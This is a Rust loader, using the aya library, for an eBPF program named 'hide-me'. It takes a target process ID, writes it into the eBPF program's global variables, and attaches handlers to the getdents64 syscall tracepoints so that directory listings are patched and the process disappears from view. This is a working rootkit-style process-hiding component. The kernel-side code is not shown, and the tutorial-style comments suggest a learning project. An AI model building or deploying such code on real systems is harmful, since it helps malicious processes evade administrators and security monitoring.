use aya::{include_bytes_aligned, maps::array::ProgramArray, programs::TracePoint, EbpfLoader};
use aya_log::EbpfLogger;
use clap::Parser;
use hide_me_common::MAX_FILE_LEN;
use log::{debug, info, warn};
use tokio::signal;

#[derive(Debug, Parser)]
struct TargetPid {
    #[clap(short, long, default_value = "0")]
    pid: u64,
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let opt = TargetPid::parse();

    // If the target pid is 0, there is nothing to hide. 
    if opt.pid == 0 {
        println!("pid is 0, nothing to hide");
        return Ok(());
    }

    // Convert the target pid to a string and copy it to a fixed-size array.
    // This is needed because the eBPF program expects a fixed-size array.
    let _line = opt.pid.to_string();
    let mut line: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
    line[.._line.len()].copy_from_slice(_line.as_bytes());

    // Initialize the logger.
    env_logger::init();

    // Bump the memlock rlimit. This is needed for older kernels that don't use the
    // new memcg based accounting, see https://lwn.net/Articles/837122/
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    // This will include your eBPF object file as raw bytes at compile-time and load it at
    // runtime. This approach is recommended for most real-world use cases. If you would
    // like to specify the eBPF program at runtime rather than at compile-time, you can
    // reach for `Bpf::load_file` instead.

    // set_global is used to set the value of a global variable in the eBPF program.
    // It is important to inform you,
    // that if you want to set the global variable in the ebpf program,
    // you should declare the global variable such as 
    // pub static mut pid_to_hide_len: u32 = 0;
    // you must delcare the variable as mut
    // or you will be surpised that the value won't be changed after you set it.

    // target_pid is the pid that we want to hide
    // pid_to_hide is the pid that we want to hide in the form of a fixed-size array
    // the size is fixed to MAX_FILE_LEN(10)
    let mut bpf = EbpfLoader::new()
        .set_global(
            "pid_to_hide_len",
            &(_line.len() as u32 + 1),
            true,
        )
        .set_global("target_pid", &opt.pid, true)
        .set_global("pid_to_hide", &line, true)
        .load(include_bytes_aligned!(
            "../../target/bpfel-unknown-none/debug/hide-me"
        ))?;

    if let Err(e) = EbpfLogger::init(&mut bpf) {
        // This can happen if you remove all log statements from your eBPF program.
        warn!("failed to initialize eBPF logger: {}", e);
    }

    // Load the hide_me function and attach it to the sys_enter_getdents64 tracepoint.
    let program: &mut TracePoint = bpf.program_mut("hide_me").unwrap().try_into()?;
    program.load()?;
    program.attach("syscalls", "sys_enter_getdents64")?;

    // get the JUMP_TABLE map
    let mut prog_array = ProgramArray::try_from(bpf.take_map("JUMP_TABLE").unwrap())?;

    // Load the handle_getdents_exit function and attach it to the sys_exit_getdents64 tracepoint.
    let prog_0: &mut TracePoint = bpf
        .program_mut("handle_getdents_exit")
        .unwrap()
        .try_into()?;
    prog_0.load()?;
    prog_0.attach("syscalls", "sys_exit_getdents64")?;

    // push the handle_getdents_exit function to the JUMP_TABLE
    // and set it's index to 0
    let prog_0_fd = prog_0.fd().unwrap();
    prog_array.set(0, prog_0_fd, 0).unwrap();

    // Load the handle_getdents_patch function.
    let prog_1: &mut TracePoint = bpf
        .program_mut("handle_getdents_patch")
        .unwrap()
        .try_into()?;

    prog_1.load()?;


    // push the handle_getdents_patch function to the JUMP_TABLE
    // and set it's index to 1
    let prog_1_fd = prog_1.fd().unwrap();
    prog_array.set(1, prog_1_fd, 0).unwrap();

    info!("Waiting for Ctrl-C...");
    signal::ctrl_c().await?;
    info!("Exiting...");

    Ok(())
}
